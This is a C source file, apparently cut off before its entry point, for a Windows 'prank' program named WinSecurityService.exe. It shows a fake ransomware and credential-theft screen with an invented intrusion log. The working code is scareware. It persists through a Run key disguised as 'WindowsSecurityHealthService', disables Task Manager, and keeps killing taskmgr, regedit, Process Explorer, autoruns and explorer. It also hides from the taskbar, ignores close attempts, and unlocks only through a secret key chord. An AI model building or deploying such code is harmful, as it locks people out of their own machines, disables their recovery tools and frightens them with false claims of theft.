/*
 * prank_main.c — WinSecurityService
 * Native Win32/GDI hacking prank. No browser, no mshta, no HTML engine.
 * Window hidden from taskbar + Alt+Tab via WS_EX_TOOLWINDOW from creation.
 *
 * Build (Linux → Win64):
 *   x86_64-w64-mingw32-gcc -O2 -mwindows -o ../WinSecurityService.exe \
 *     prank_main.c prank.res -lshell32 -lshlwapi -lwinhttp \
 *     -ltlhelp32 -ladvapi32
 */
#define WIN32_LEAN_AND_MEAN
#define UNICODE
#define _UNICODE
#include <windows.h>
#include <shellapi.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>

/* ─── Registry paths ────────────────────────────────────────────────────────── */
#define REG_RUN    L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define REG_RUN_N  L"WindowsSecurityHealthService"
#define REG_TM     L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
#define REG_CTR    L"Software\\WinDefend"
#define REG_CTR_N  L"ServiceRunCount"
#define MAX_REBOOTS 2

/* ─── Colors ────────────────────────────────────────────────────────────────── */
#define C_BG     RGB(0,0,0)
#define C_PANEL  RGB(0,5,2)
#define C_GRN0   RGB(0,255,65)
#define C_GRN1   RGB(0,190,50)
#define C_GRN2   RGB(0,130,35)
#define C_GRN3   RGB(0,80,22)
#define C_GRN4   RGB(0,45,12)
#define C_GRN5   RGB(0,20,5)
#define C_DARK   RGB(0,50,15)
#define C_RED    RGB(255,0,0)
#define C_REDDK  RGB(130,0,0)
#define C_YELL   RGB(255,204,0)
#define C_CYAN   RGB(0,200,255)
#define C_WHITE  RGB(210,210,210)
#define C_DIM    RGB(100,100,100)

static const COLORREF TRAIL_C[] = { C_GRN0,C_GRN1,C_GRN2,C_GRN3,C_GRN4,C_GRN5 };
#define TRAIL_LEN 6

/* ─── Layout ─────────────────────────────────────────────────────────────────── */
#define BANNER_H 44
#define STATUS_H 28
#define GPAD     14

/* ─── Matrix charset (katakana + hex digits) ────────────────────────────────── */
static const WCHAR MAT[] =
    L"\x30A2\x30A4\x30A6\x30A8\x30AA\x30AB\x30AD\x30AF\x30B1\x30B3"
    L"\x30B5\x30B7\x30B9\x30BB\x30BD\x30BF\x30C1\x30C4\x30C6\x30C8"
    L"0123456789ABCDEF<>[]{}/\\|";
#define MAT_N (sizeof(MAT)/sizeof(WCHAR)-1)

/* ─── Global state ──────────────────────────────────────────────────────────── */
static int SW, SH;

/* Matrix rain */
#define MAX_DROPS 300
typedef struct { int y; int period; int ticks; WCHAR ch[TRAIL_LEN]; } Drop;
static Drop  g_d[MAX_DROPS];
static int   g_nd;
static int   g_cw=14, g_ch=16;

/* Terminal log */
#define LOG_MAX 22
static WCHAR    g_log[LOG_MAX][260];
static COLORREF g_logc[LOG_MAX];
static int      g_logn=0, g_logpi=0, g_logTimer=0;
typedef struct { const WCHAR *t; COLORREF c; } LE;
static const LE LOG_POOL[]={
    {L"> Initializing exploit framework v4.2.1...",       C_DIM  },
    {L"> Target identified: scanning open ports...",       C_GRN0 },
    {L"> Port 22 (SSH)   OPEN",                           C_GRN0 },
    {L"> Port 445 (SMB)  OPEN",                           C_GRN0 },
    {L"> Port 3389 (RDP) OPEN",                           C_GRN0 },
    {L"> Deploying zero-day payload CVE-2024-38189...",   C_YELL },
    {L"> Firewall 0x4f7a bypassed \x2014 SUCCESS",        C_GRN0 },
    {L"> Dumping LSASS memory...",                         C_CYAN },
    {L"> NTLM: 8846f7eaee8fb117ad06bdd830b7586c",         C_CYAN },
    {L"> Windows Defender: DISABLED",                      C_RED  },
    {L"> Shadow copies: DELETED",                          C_RED  },
    {L"> Enumerating C:\\Users\\...",                      C_CYAN },
    {L"  Documents\\taxes_2024.xlsx",                     C_WHITE},
    {L"  Documents\\passwords.txt",                       C_WHITE},
    {L"  AppData\\Chrome\\Default\\Login Data",           C_WHITE},
    {L"> Stealing Chrome credentials...",                  C_YELL },
    {L"> 47 saved passwords extracted",                    C_RED  },
    {L"> Uploading to 45.142.212.100:8443...",            C_GRN0 },
    {L"> Ransomware module: ARMED",                        C_RED  },
    {L"> Encrypting files with AES-256...",               C_YELL },
    {L"  Documents (847 files) \x2014 ENCRYPTED",         C_DIM  },
    {L"  Pictures  (1,204 files) \x2014 ENCRYPTED",       C_DIM  },
    {L"> Wiping event logs...",                            C_RED  },
    {L"  Security.evtx \x2014 ERASED",                    C_DIM  },
    {L"  System.evtx   \x2014 ERASED",                    C_DIM  },
    {L"> OPERATION COMPLETE \x2014 RANSOMWARE DEPLOYED",   C_RED  },
};
#define LOG_POOL_N ((int)(sizeof(LOG_POOL)/sizeof(LOG_POOL[0])))

/* Progress bars */
typedef struct { const WCHAR *lbl; float pct; int red; int st; } PB;
static PB g_pb[]={
    {L"Bypassing Firewall",   0,0,  0},
    {L"Decrypting Passwords", 0,0, 80},
    {L"Extracting Files",     0,0,180},
    {L"Uploading to C2",      0,1,280},
    {L"Wiping Logs",          0,1,400},
};
#define PB_N 5

/* Counters */
static long long g_bytes=0;
static int g_files=0, g_pass=0;

/* System info */
static WCHAR g_host[64]=L"DESKTOP-???";
static WCHAR g_user[64]=L"user";
static WCHAR g_ip[64]  =L"Resolving...";
static WCHAR g_disk[64]=L"...";
static WCHAR g_ram[32] =L"...";
static WCHAR g_oct[8]  =L"0";

/* Timing */
static int g_tick=0, g_slow=0;

/* FX */
static int g_shakeTk=0, g_shakeX=0, g_shakeY=0, g_flashTk=0;

/* Modal */
static BOOL g_modal=FALSE;
static int  g_mCnt=10, g_mStk=0;

/* Chord */
static BOOL  g_altEsc=FALSE;
static DWORD g_altMs=0;
static BOOL  g_done=FALSE;

/* Startup / BSOD flags */
static BOOL g_startup=FALSE, g_bsod=FALSE;

/* Fonts */
static HFONT g_fm, g_fsm, g_fbig;

/* Back buffer */
static HDC     g_buf=NULL;
static HBITMAP g_bm=NULL;

/* Taskbar handles */
static HWND g_tb=NULL, g_tb2=NULL, g_ov=NULL;

/* ─── Registry helpers ──────────────────────────────────────────────────────── */
static int RegReadInt(HKEY root, const WCHAR *path, const WCHAR *val) {
    HKEY hk; DWORD v=0,sz=sizeof(v);
    if (RegOpenKeyExW(root,path,0,KEY_READ,&hk)!=ERROR_SUCCESS) return 0;
    RegQueryValueExW(hk,val,NULL,NULL,(BYTE*)&v,&sz);
    RegCloseKey(hk); return (int)v;
}
static void RegWriteInt(HKEY root,const WCHAR *path,const WCHAR *val,int n){
    HKEY hk; DWORD v=(DWORD)n;
    RegCreateKeyExW(root,path,0,NULL,0,KEY_SET_VALUE,NULL,&hk,NULL);
    RegSetValueExW(hk,val,0,REG_DWORD,(BYTE*)&v,sizeof(v));
    RegCloseKey(hk);
}
static void RegDelVal(HKEY root,const WCHAR *path,const WCHAR *val){
    HKEY hk;
    if(RegOpenKeyExW(root,path,0,KEY_SET_VALUE,&hk)==ERROR_SUCCESS){
        RegDeleteValueW(hk,val); RegCloseKey(hk);
    }
}
static void RegWriteStr(HKEY root,const WCHAR *path,const WCHAR *val,const WCHAR *data){
    HKEY hk;
    RegCreateKeyExW(root,path,0,NULL,0,KEY_SET_VALUE,NULL,&hk,NULL);
    RegSetValueExW(hk,val,0,REG_SZ,(BYTE*)data,(DWORD)((wcslen(data)+1)*sizeof(WCHAR)));
    RegCloseKey(hk);
}

/* ─── Admin helpers ─────────────────────────────────────────────────────────── */
static void DisableTM(void){RegWriteInt(HKEY_CURRENT_USER,REG_TM,L"DisableTaskMgr",1);}
static void EnableTM(void) {RegDelVal(HKEY_CURRENT_USER,REG_TM,L"DisableTaskMgr");}

static void InstallStartup(void){
    WCHAR exe[MAX_PATH],cmd[MAX_PATH+16];
    GetModuleFileNameW(NULL,exe,MAX_PATH);
    swprintf(cmd,MAX_PATH+16,L"\"%s\" -Startup%s",exe,g_bsod?L" -BSOD":L"");
    RegWriteStr(HKEY_CURRENT_USER,REG_RUN,REG_RUN_N,cmd);
}
static void RemoveStartup(void){RegDelVal(HKEY_CURRENT_USER,REG_RUN,REG_RUN_N);}

/* ─── Restore taskbar & explorer ────────────────────────────────────────────── */
static void RestoreShell(void){
    /* Stop blocking first so the killer thread won't restart explorer */
    g_done=TRUE;
    /* Restart explorer */
    HANDLE snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    BOOL explorerAlive=FALSE;
    if(snap!=INVALID_HANDLE_VALUE){
        PROCESSENTRY32W pe={sizeof(pe)};
        if(Process32FirstW(snap,&pe)) do {
            if(_wcsicmp(pe.szExeFile,L"explorer.exe")==0){explorerAlive=TRUE;break;}
        } while(Process32NextW(snap,&pe));
        CloseHandle(snap);
    }
    if(!explorerAlive){
        STARTUPINFOW si={sizeof(si)};PROCESS_INFORMATION pi;
        CreateProcessW(NULL,(LPWSTR)L"explorer.exe",NULL,NULL,FALSE,0,NULL,NULL,&si,&pi);
        if(pi.hProcess){CloseHandle(pi.hProcess);CloseHandle(pi.hThread);}
        Sleep(1800);
    }
    /* Re-find taskbar (explorer just restarted) and show it */
    HWND tb=FindWindowW(L"Shell_TrayWnd",NULL);
    if(tb) ShowWindow(tb,SW_SHOW);
    EnableTM();
}

/* ─── Forbidden process killer thread ──────────────────────────────────────── */
static const WCHAR *BLOCKED[]={
    L"taskmgr",L"procexp",L"procexp64",L"ProcessHacker",L"SystemInformer",
    L"perfmon",L"resmon",L"regedit",L"msconfig",L"autoruns",L"autoruns64",
    L"explorer",NULL
};
DWORD WINAPI KillerThread(LPVOID p){
    (void)p;
    while(!g_done){
        Sleep(500);
        HANDLE snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
        if(snap==INVALID_HANDLE_VALUE) continue;
        PROCESSENTRY32W pe={sizeof(pe)};
        if(Process32FirstW(snap,&pe)) do {
            WCHAR nm[MAX_PATH]; wcsncpy(nm,pe.szExeFile,MAX_PATH);
            WCHAR *dot=wcsrchr(nm,L'.'); if(dot)*dot=0;
            for(int i=0;BLOCKED[i];i++){
                if(_wcsicmp(nm,BLOCKED[i])==0){
                    HANDLE hp=OpenProcess(PROCESS_TERMINATE,FALSE,pe.th32ProcessID);
                    if(hp){TerminateProcess(hp,1);CloseHandle(hp);}
                    break;
                }
            }
        } while(Process32NextW(snap,&pe));
        CloseHandle(snap);
    }
    return 0;
}

/* ─── Beep thread ───────────────────────────────────────────────────────────── */
DWORD WINAPI BeepThread(LPVOID p){
    (void)p;
    Sleep(8000);
    int cycle=0;
    while(!g_done){
        Beep(1200,100); Sleep(180);
        Beep(800, 100); Sleep(180);
        Beep(1200,100);
        cycle++;
        int delay=(cycle<4)?8000:(cycle<8)?4000:2000;
        for(int i=0;i<delay&&!g_done;i+=100) Sleep(100);
    }
    return 0;
}

/* ─── IP fetch thread ───────────────────────────────────────────────────────── */
DWORD WINAPI IPThread(LPVOID p){
    (void)p;
    HINTERNET hs=WinHttpOpen(L"WS/1",WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                              WINHTTP_NO_PROXY_NAME,WINHTTP_NO_PROXY_BYPASS,0);
    if(!hs) return 0;
    HINTERNET hc=WinHttpConnect(hs,L"api.ipify.org",INTERNET_DEFAULT_HTTP_PORT,0);
    if(!hc){WinHttpCloseHandle(hs);return 0;}
    HINTERNET hr=WinHttpOpenRequest(hc,L"GET",L"/",NULL,WINHTTP_NO_REFERER,
                                    WINHTTP_DEFAULT_ACCEPT_TYPES,0);
    if(hr&&WinHttpSendRequest(hr,WINHTTP_NO_ADDITIONAL_HEADERS,0,
                               WINHTTP_NO_REQUEST_DATA,0,0,0)
         &&WinHttpReceiveResponse(hr,NULL)){
        char buf[64]={0}; DWORD rd=0;
        WinHttpReadData(hr,buf,63,&rd);
        if(rd) MultiByteToWideChar(CP_UTF8,0,buf,-1,g_ip,64);
    }
    if(hr) WinHttpCloseHandle(hr);
    WinHttpCloseHandle(hc); WinHttpCloseHandle(hs);
    return 0;
}

/* ─── GDI helpers ───────────────────────────────────────────────────────────── */
static void FillR(HDC dc,int x,int y,int w,int h,COLORREF c){
    RECT r={x,y,x+w,y+h};
    HBRUSH b=CreateSolidBrush(c); FillRect(dc,&r,b); DeleteObject(b);
}
static void FrameR(HDC dc,int x,int y,int w,int h,COLORREF c){
    HPEN p=CreatePen(PS_SOLID,1,c); HGDIOBJ o=SelectObject(dc,p);
    MoveToEx(dc,x,y,NULL);LineTo(dc,x+w-1,y);LineTo(dc,x+w-1,y+h-1);
    LineTo(dc,x,y+h-1);LineTo(dc,x,y);
    SelectObject(dc,o); DeleteObject(p);
}
static void DrawT(HDC dc,const WCHAR *s,int x,int y,COLORREF c,HFONT f){
    if(f) SelectObject(dc,f);
    SetTextColor(dc,c); SetBkMode(dc,TRANSPARENT);
    TextOutW(dc,x,y,s,(int)wcslen(s));
}
static void DrawTF(HDC dc,const WCHAR *s,int x,int y,int w,COLORREF c,HFONT f,UINT fmt){
    RECT r={x,y,x+w,y+200};
    if(f) SelectObject(dc,f);
    SetTextColor(dc,c); SetBkMode(dc,TRANSPARENT);
    DrawTextW(dc,s,-1,&r,fmt|DT_NOPREFIX);
}
static int rnd(int n){return n?(rand()%n):0;}
static float rndf(void){return (float)rand()/RAND_MAX;}

/* ─── Matrix rain ───────────────────────────────────────────────────────────── */
static void MatInit(void){
    g_nd=SW/g_cw; if(g_nd>MAX_DROPS) g_nd=MAX_DROPS;
    int periods[]={3,5,7,10,15,20};
    for(int i=0;i<g_nd;i++){
        g_d[i].y    = rnd(SH/g_ch);
        g_d[i].period = periods[rnd(6)];
        g_d[i].ticks = rnd(g_d[i].period);
        for(int t=0;t<TRAIL_LEN;t++) g_d[i].ch[t]=MAT[rnd(MAT_N)];
    }
}
static void MatTick(void){
    for(int i=0;i<g_nd;i++){
        g_d[i].ticks++;
        if(g_d[i].ticks>=g_d[i].period){
            g_d[i].ticks=0;
            /* shift trail */
            for(int t=TRAIL_LEN-1;t>0;t--) g_d[i].ch[t]=g_d[i].ch[t-1];
            g_d[i].ch[0]=MAT[rnd(MAT_N)];
            g_d[i].y++;
            if(g_d[i].y>SH/g_ch+TRAIL_LEN){
                g_d[i].y=-(rnd(8)+1);
                g_d[i].period=((int[]){3,5,7,10,15,20})[rnd(6)];
            }
        }
    }
}
static void MatDraw(HDC dc){
    WCHAR buf[2]={0,0};
    HFONT old=(HFONT)SelectObject(dc,g_fsm);
    SetBkMode(dc,TRANSPARENT);
    for(int i=0;i<g_nd;i++){
        int x=i*g_cw;
        for(int t=0;t<TRAIL_LEN;t++){
            int cy=g_d[i].y-t;
            if(cy<0||cy>SH/g_ch) continue;
            SetTextColor(dc,TRAIL_C[t]);
            buf[0]=g_d[i].ch[t];
            TextOutW(dc,x,cy*g_ch,buf,1);
        }
    }
    SelectObject(dc,old);
}

/* ─── Scanlines ─────────────────────────────────────────────────────────────── */
static void DrawScanlines(HDC dc){
    HPEN p=CreatePen(PS_SOLID,1,RGB(0,0,0)); HGDIOBJ o=SelectObject(dc,p);
    for(int y=0;y<SH;y+=4){
        MoveToEx(dc,0,y,NULL); LineTo(dc,SW,y);
    }
    SelectObject(dc,o); DeleteObject(p);
}

/* ─── Vignette (corner darkening) ───────────────────────────────────────────── */
static void DrawVignette(HDC dc){
    /* 8 concentric border bands fading from red-black to transparent */
    static const COLORREF bands[]={
        RGB(60,0,0),RGB(45,0,0),RGB(30,0,0),RGB(20,0,0),
        RGB(12,0,0),RGB(6,0,0),RGB(3,0,0),RGB(1,0,0)
    };
    for(int i=0;i<8;i++){
        int th=i*3+2;
        HPEN p=CreatePen(PS_SOLID,th,bands[i]); HGDIOBJ o=SelectObject(dc,p);
        SelectObject(dc,GetStockObject(NULL_BRUSH));
        Rectangle(dc,th/2,th/2,SW-th/2,SH-th/2);
        SelectObject(dc,o); DeleteObject(p);
    }
}

/* ─── Top banner ────────────────────────────────────────────────────────────── */
static void DrawBanner(HDC dc){
    /* Background */
    FillR(dc,0,0,SW,BANNER_H,RGB(15,0,0));
    FrameR(dc,0,0,SW,BANNER_H,
           (g_tick%20<10)?C_RED:RGB(80,0,0));
    /* Title */
    DrawT(dc,L"\x26A0 UNAUTHORIZED ACCESS DETECTED \x26A0",
          GPAD,12,C_RED,g_fm);
    /* Attacker IP */
    WCHAR ipbuf[80];
    swprintf(ipbuf,80,L"TRACING ATTACKER: 185.220.101.%s",g_oct);
    DrawT(dc,ipbuf,SW/2-120,12,RGB(255,100,100),g_fsm);
    /* Clock */
    SYSTEMTIME st; GetLocalTime(&st);
    WCHAR clk[32];
    swprintf(clk,32,L"%02d:%02d:%02d",st.wHour,st.wMinute,st.wSecond);
    DrawT(dc,clk,SW-90,12,C_DIM,g_fsm);
}

/* ─── Terminal log panel ────────────────────────────────────────────────────── */
static void DrawTerminal(HDC dc,int x,int y,int w,int h){
    FillR(dc,x,y,w,h,C_PANEL);
    FrameR(dc,x,y,w,h,C_DARK);
    DrawT(dc,L"[ SYSTEM INTRUSION LOG \x2014 LIVE FEED ]",x+8,y+6,C_DARK,g_fsm);
    int lineH=16, startY=y+24;
    int maxLines=(h-30)/lineH;
    int start=g_logn>maxLines?g_logn-maxLines:0;
    for(int i=start;i<g_logn&&i<LOG_MAX;i++){
        DrawT(dc,g_log[i],x+8,startY+(i-start)*lineH,g_logc[i],g_fsm);
    }
}

/* ─── Right panels ──────────────────────────────────────────────────────────── */
static void DrawProgress(HDC dc,int x,int y,int w){
    FillR(dc,x,y,w,156,C_PANEL);
    FrameR(dc,x,y,w,156,C_DARK);
    DrawT(dc,L"OPERATION STATUS",x+8,y+6,C_DARK,g_fsm);
    for(int i=0;i<PB_N;i++){
        int py=y+22+i*26;
        /* label + pct */
        WCHAR pct[8]; swprintf(pct,8,L"%d%%",(int)g_pb[i].pct);
        DrawT(dc,g_pb[i].lbl,x+8,py,C_DIM,g_fsm);
        DrawT(dc,pct,x+w-28,py,C_GRN0,g_fsm);
        /* bar bg */
        FillR(dc,x+8,py+13,w-16,5,RGB(5,15,5));
        FrameR(dc,x+8,py+13,w-16,5,RGB(0,35,10));
        /* bar fill */
        int bw=(int)((w-16)*g_pb[i].pct/100.f);
        if(bw>0)
            FillR(dc,x+8,py+13,bw,5,g_pb[i].red?C_RED:C_GRN0);
    }
}
static void DrawInfo(HDC dc,int x,int y,int w){
    int h=204;
    FillR(dc,x,y,w,h,C_PANEL);
    FrameR(dc,x,y,w,h,C_DARK);
    DrawT(dc,L"TARGET ACQUIRED",x+8,y+6,C_DARK,g_fsm);
    const WCHAR *keys[]={L"HOSTNAME",L"PUBLIC IP",L"OS",L"USER",L"DISK (C:)",L"RAM",L"FILES",L"PASSWORDS"};
    WCHAR vals[8][80];
    swprintf(vals[0],80,L"%s",g_host);
    swprintf(vals[1],80,L"%s",g_ip);
    swprintf(vals[2],80,L"Windows 11 Pro x64");
    swprintf(vals[3],80,L"%s",g_user);
    swprintf(vals[4],80,L"%s",g_disk);
    swprintf(vals[5],80,L"%s",g_ram);
    swprintf(vals[6],80,L"%d",g_files);
    swprintf(vals[7],80,L"%d",g_pass);
    for(int i=0;i<8;i++){
        int iy=y+22+i*22;
        DrawT(dc,keys[i],x+8,iy,C_DARK,g_fsm);
        COLORREF vc=(i==6||i==7)?C_RED:C_GRN0;
        DrawT(dc,vals[i],x+w/2,iy,vc,g_fsm);
        /* divider */
        HPEN p=CreatePen(PS_SOLID,1,RGB(0,20,6));
        HGDIOBJ o=SelectObject(dc,p);
        MoveToEx(dc,x+6,iy+18,NULL); LineTo(dc,x+w-6,iy+18);
        SelectObject(dc,o); DeleteObject(p);
    }
}
static void DrawHex(HDC dc,int x,int y,int w,int h){
    FillR(dc,x,y,w,h,C_PANEL);
    FrameR(dc,x,y,w,h,C_DARK);
    DrawT(dc,L"MEMORY DUMP",x+8,y+6,C_DARK,g_fsm);
    WCHAR row[80]; int ry=y+22;
    for(int r=0;r<(h-30)/14&&ry+14<y+h;r++,ry+=14){
        int addr=0x0040+r*16;
        int n=swprintf(row,80,L"%08X  ",addr);
        for(int b=0;b<8;b++)
            n+=swprintf(row+n,80-n,L"%02X ",rnd(256));
        DrawT(dc,row,x+6,ry,RGB(0,35,10),g_fsm);
    }
}

/* ─── Status bar ────────────────────────────────────────────────────────────── */
static const WCHAR *STATMSGS[]={
    L"SYSTEM COMPROMISED \x2014 DO NOT DISCONNECT",
    L"UPLOADING DATA TO REMOTE SERVER...",
    L"ENCRYPTION IN PROGRESS \x2014 FILES LOCKED",
    L"DO NOT TURN OFF YOUR COMPUTER",
    L"RANSOMWARE ARMED \x2014 AWAITING CONFIRMATION",
};
#define STAT_N 5
static void DrawStatus(HDC dc){
    int y=SH-28;
    FillR(dc,0,y,SW,28,RGB(10,0,0));
    FrameR(dc,0,y,SW,28,RGB(50,0,0));
    DrawT(dc,STATMSGS[(g_slow/10)%STAT_N],GPAD,y+6,C_RED,g_fsm);
    WCHAR b[64]; swprintf(b,64,L"%lld bytes exfiltrated",g_bytes);
    DrawT(dc,b,SW-260,y+6,C_DIM,g_fsm);
}

/* ─── Countdown modal ───────────────────────────────────────────────────────── */
static void DrawModal(HDC dc){
    /* dim overlay */
    for(int i=0;i<8;i++) FillR(dc,i,i,SW-2*i,SH-2*i,RGB(0,0,0));
    int mw=480,mh=300,mx=(SW-mw)/2,my=(SH-mh)/2;
    FillR(dc,mx,my,mw,mh,C_BG);
    /* pulsing border */
    COLORREF bc=(g_tick%16<8)?C_RED:C_REDDK;
    for(int i=0;i<3;i++) FrameR(dc,mx-i,my-i,mw+2*i,mh+2*i,bc);
    /* skull */
    DrawT(dc,L"\U0001F480",mx+mw/2-20,my+20,C_RED,g_fbig);
    DrawT(dc,L"YOU'VE BEEN HACKED",mx+40,my+90,C_RED,g_fbig);
    WCHAR sub[120];
    swprintf(sub,120,
        L"All files encrypted.   Passwords stolen: %d\n"
        L"Data uploaded: %.1f MB",
        g_pass,(float)g_bytes/1048576.f);
    DrawTF(dc,sub,mx+40,my+140,mw-80,RGB(255,100,100),g_fsm,DT_LEFT);
    DrawT(dc,L"SELF-DESTRUCT IN:",mx+mw/2-80,my+190,C_RED,g_fm);
    WCHAR cnt[8];
    if(g_mCnt>0) swprintf(cnt,8,L"%d",g_mCnt);
    else         wcscpy(cnt,L"\U0001F480");
    DrawT(dc,cnt,mx+mw/2-18,my+215,C_YELL,g_fbig);
}

/* ─── Reveal screen ─────────────────────────────────────────────────────────── */
static void DrawReveal(HDC dc){
    FillR(dc,0,0,SW,SH,C_BG);
    DrawT(dc,L"\U0001F602",SW/2-32,SH/2-120,C_GRN0,g_fbig);
    DrawT(dc,L"GOT YOU!",SW/2-80,SH/2-60,C_GRN0,g_fbig);
    DrawT(dc,L"Relax \x2014 nothing happened to your computer.",SW/2-230,SH/2+10,C_WHITE,g_fm);
    DrawT(dc,L"This was just a harmless prank page.",SW/2-190,SH/2+36,C_DIM,g_fm);
    DrawT(dc,L"Closing in a few seconds...",SW/2-120,SH/2+80,C_DARK,g_fsm);
}

/* ─── Full frame render ─────────────────────────────────────────────────────── */
static BOOL g_revealShown=FALSE;
static DWORD g_revealMs=0;

static void RenderFrame(HDC screenDC){
    if(!g_buf) return;
    HDC dc=g_buf;
    FillR(dc,0,0,SW,SH,C_BG);

    if(g_revealShown){ DrawReveal(dc); goto blit; }

    MatDraw(dc);
    DrawScanlines(dc);
    DrawVignette(dc);

    /* Layout */
    int mainY=BANNER_H+4, mainH=SH-BANNER_H-28-8;
    int lw=(SW*62/100)-GPAD*2, rw=SW-lw-GPAD*4;
    int lx=GPAD, rx=lx+lw+GPAD*2;

    DrawBanner(dc);
    DrawTerminal(dc,lx,mainY,lw,mainH);

    /* Right column */
    int ry=mainY;
    DrawProgress(dc,rx,ry,rw); ry+=160;
    DrawInfo(dc,rx,ry,rw);     ry+=208;
    int hexH=mainH-(160+208);
    if(hexH>40) DrawHex(dc,rx,ry,rw,hexH);

    DrawStatus(dc);
    if(g_modal) DrawModal(dc);

    /* Flash overlay */
    if(g_flashTk>0){
        int a=g_flashTk*28; if(a>180)a=180;
        /* approximate alpha with hatch of red pixels */
        HBRUSH hb=CreateSolidBrush(RGB(a,0,0));
        RECT rr={0,0,SW,SH};
        /* Just paint a tinted overlay via SetROP2 */
        HBRUSH ob=(HBRUSH)SelectObject(dc,hb);
        HPEN np=(HPEN)SelectObject(dc,GetStockObject(NULL_PEN));
        /* Use PATPAINT to merge red with existing content */
        SetROP2(dc,R2_MERGEPEN);
        Rectangle(dc,0,0,SW,SH);
        SetROP2(dc,R2_COPYPEN);
        SelectObject(dc,ob); SelectObject(dc,np);
        DeleteObject(hb);
    }

blit:
    BitBlt(screenDC,g_shakeX,g_shakeY,SW,SH,dc,0,0,SRCCOPY);
    /* fill shake gaps */
    if(g_shakeX||g_shakeY)
        FillR(screenDC,0,0,abs(g_shakeX),SH,C_BG),
        FillR(screenDC,0,0,SW,abs(g_shakeY),C_BG);
}

/* ─── Animation tick (50 ms) ────────────────────────────────────────────────── */
static void Shake(void){
    g_shakeTk=7; g_flashTk=4;
}
static void AnimTick(void){
    g_tick++;
    MatTick();

    /* IP octet flicker */
    swprintf(g_oct,8,L"%d",rnd(256));

    /* shake decay */
    if(g_shakeTk>0){
        g_shakeTk--;
        g_shakeX=(rnd(10)-5); g_shakeY=(rnd(6)-3);
    } else { g_shakeX=0; g_shakeY=0; }
    if(g_flashTk>0) g_flashTk--;

    /* terminal: new line every 5 ticks */
    g_logTimer++;
    if(g_logTimer>=5){
        g_logTimer=0;
        const LE *e=&LOG_POOL[g_logpi%LOG_POOL_N]; g_logpi++;
        if(g_logn<LOG_MAX){
            wcsncpy(g_log[g_logn],e->t,259);
            g_logc[g_logn]=e->c;
            g_logn++;
        } else {
            /* scroll up */
            memmove(g_log,g_log[1],(LOG_MAX-1)*sizeof(g_log[0]));
            memmove(g_logc,g_logc+1,(LOG_MAX-1)*sizeof(g_logc[0]));
            wcsncpy(g_log[LOG_MAX-1],e->t,259);
            g_logc[LOG_MAX-1]=e->c;
        }
        if(rnd(10)<2) Shake();
    }

    /* random shake */
    if(rnd(100)<2) Shake();
}

/* ─── Slow tick (300 ms) ────────────────────────────────────────────────────── */
static void SlowTick(void){
    g_slow++;

    /* progress bars */
    static const float speeds[]={0.7f,0.5f,0.45f,0.6f,0.4f};
    for(int i=0;i<PB_N;i++){
        if(g_slow*300 >= g_pb[i].st*50 && g_pb[i].pct<100.f){
            g_pb[i].pct+=speeds[i]+rndf()*0.8f;
            if(g_pb[i].pct>100.f) g_pb[i].pct=100.f;
        }
    }

    /* counters */
    g_files+=rnd(10);
    if(rnd(20)<1&&g_pass<47) g_pass++;
    g_bytes+=rnd(200000)+50000LL;

    /* modal after 30 s */
    if(g_slow*300>=30000&&!g_modal){
        g_modal=TRUE; Shake();
    }
    if(g_modal&&!g_revealShown){
        g_mStk++;
        if(g_mStk>=3){  /* ~1 s */
            g_mStk=0;
            if(g_mCnt>0){ g_mCnt--; Shake(); }
        }
    }
}

/* ─── Window procedure ──────────────────────────────────────────────────────── */
#define TID_ANIM 1
#define TID_SLOW 2

static LRESULT CALLBACK WndProc(HWND hw,UINT msg,WPARAM wp,LPARAM lp){
    switch(msg){
    case WM_CREATE:{
        /* back buffer */
        HDC sdc=GetDC(hw);
        g_buf=CreateCompatibleDC(sdc);
        g_bm=CreateCompatibleBitmap(sdc,SW,SH);
        SelectObject(g_buf,g_bm);
        ReleaseDC(hw,sdc);
        /* fonts */
        g_fm =CreateFontW(13,0,0,0,FW_NORMAL,0,0,0,DEFAULT_CHARSET,0,0,CLEARTYPE_QUALITY,FIXED_PITCH|FF_MODERN,L"Courier New");
        g_fsm=CreateFontW(11,0,0,0,FW_NORMAL,0,0,0,DEFAULT_CHARSET,0,0,CLEARTYPE_QUALITY,FIXED_PITCH|FF_MODERN,L"Courier New");
        g_fbig=CreateFontW(30,0,0,0,FW_BOLD,0,0,0,DEFAULT_CHARSET,0,0,CLEARTYPE_QUALITY,VARIABLE_PITCH,L"Courier New");
        MatInit();
        SetTimer(hw,TID_ANIM,50,NULL);
        SetTimer(hw,TID_SLOW,300,NULL);
        return 0;
    }
    case WM_DESTROY:
        KillTimer(hw,TID_ANIM); KillTimer(hw,TID_SLOW);
        DeleteDC(g_buf); DeleteObject(g_bm);
        DeleteObject(g_fm); DeleteObject(g_fsm); DeleteObject(g_fbig);
        PostQuitMessage(0);
        return 0;
    case WM_ERASEBKGND: return 1;
    case WM_PAINT:{
        PAINTSTRUCT ps;
        HDC dc=BeginPaint(hw,&ps);
        RenderFrame(dc);
        EndPaint(hw,&ps);
        return 0;
    }
    case WM_TIMER:
        if(wp==TID_ANIM){ AnimTick(); InvalidateRect(hw,NULL,FALSE); }
        else             { SlowTick(); }
        /* close after reveal */
        if(g_revealShown&&GetTickCount()-g_revealMs>4000)
            DestroyWindow(hw);
        return 0;
    case WM_SYSKEYDOWN:  /* Alt+key comes as SYSKEYDOWN */
    case WM_KEYDOWN:{
        BOOL alt=(GetKeyState(VK_MENU)&0x8000)!=0;
        if(alt&&wp==VK_ESCAPE){
            g_altEsc=TRUE; g_altMs=GetTickCount();
        }
        if(alt&&wp==VK_UP&&g_altEsc&&(GetTickCount()-g_altMs)<2000){
            /* REVEAL */
            g_altEsc=FALSE;
            g_done=TRUE;
            g_revealShown=TRUE; g_revealMs=GetTickCount();
            RestoreShell();
            RemoveStartup();
            RegDelVal(HKEY_CURRENT_USER,REG_CTR,REG_CTR_N);
            ShowCursor(TRUE);
            InvalidateRect(hw,NULL,FALSE);
        }
        return 0;
    }
    /* absorb close attempts */
    case WM_CLOSE: return 0;
    default: return DefWindowProcW(hw,msg,wp,lp);
    }
}

/* ─── Entry point ───────────────────────────────────────────────────────────── */
